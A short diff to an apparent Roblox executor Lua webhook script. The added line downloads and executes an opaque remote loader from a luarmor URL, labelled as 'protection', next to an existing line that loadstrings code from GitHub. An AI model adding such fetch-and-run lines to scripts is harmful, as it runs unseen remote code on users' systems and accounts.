@@ -1,5 +1,6 @@
 -- EmbedSendCoolodwn needs to be defined as an integer and WebHookUrl needs to be defined as a string when executing!!!!
 local WebHookService = loadstring(game:HttpGet("https://raw.githubusercontent.com/SnowyV4/LuaStuffz/main/WebHookService.lua"))()
+local WebHookProtectionInc = loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/0c2c98fcbf178f8eb9b8e9bc8486da7d.lua"))()
 
 local LP = game.Players.LocalPlayer
 
